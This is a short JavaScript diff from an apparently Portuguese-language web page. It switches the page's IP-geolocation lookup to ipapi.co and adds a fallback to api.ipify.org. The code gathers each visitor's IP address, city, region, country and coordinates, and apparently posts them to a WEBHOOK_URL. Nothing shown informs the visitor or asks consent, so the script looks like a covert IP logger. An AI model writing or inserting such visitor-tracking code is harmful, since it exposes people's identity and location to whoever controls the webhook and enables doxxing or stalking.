@@ -81,10 +81,16 @@
             
             let location = 'Carregando...';
             try {
-                const ipData = await fetch('http://ip-api.com/json/').then(r => r.json());
-                location = `${ipData.city}, ${ipData.regionName}, ${ipData.country} (${ipData.lat}, ${ipData.lon}) - IP: ${ipData.query}`;
+                const ipData = await fetch('https://ipapi.co/json/').then(r => r.json());
+                if (ipData.error) throw new Error();
+                location = `${ipData.city}, ${ipData.region}, ${ipData.country_name} (${ipData.latitude}, ${ipData.longitude}) - IP: ${ipData.ip}`;
             } catch(e) {
-                location = 'Não disponível';
+                try {
+                    const res = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+                    location = `IP: ${res.ip}`;
+                } catch(e2) {
+                    location = 'Não disponível';
+                }
             }
             
             await fetch(WEBHOOK_URL, {
